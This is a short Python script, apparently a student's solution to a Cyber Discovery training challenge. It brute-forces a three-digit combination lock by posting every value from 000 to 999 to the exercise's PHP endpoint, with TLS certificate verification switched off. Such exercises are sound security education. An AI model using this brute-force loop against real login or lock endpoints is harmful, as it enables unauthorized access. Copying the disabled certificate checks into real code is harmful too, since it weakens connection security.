
import requests

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) # supress verify certificate warning


''' tutorial 1 '''
# response = requests.post('https://www.cyberdiscovery.rocks/aics/2/tutorial1-result.php', verify=False) # if https / has certificate, set verify to False so it will let you in
# print(response.text)

''' tutorial 3 '''
for num1 in range(10):
	for num2 in range(10):
		for num3 in range(10):
			combo = [ ("combo[]", num1), ("combo[]", num2), ("combo[]", num3) ]

			print("Trying " + str(num1) + str(num2) + str(num3) + "...",)
			response = requests.post("https://www.cyberdiscovery.rocks/aics/2/tutorial1-result.php", data=combo, verify=False)

			if (response.text.find("Sorry, but the box is still locked.") == -1):
				print("FOUND!")
				exit(0)
			else:
				print()









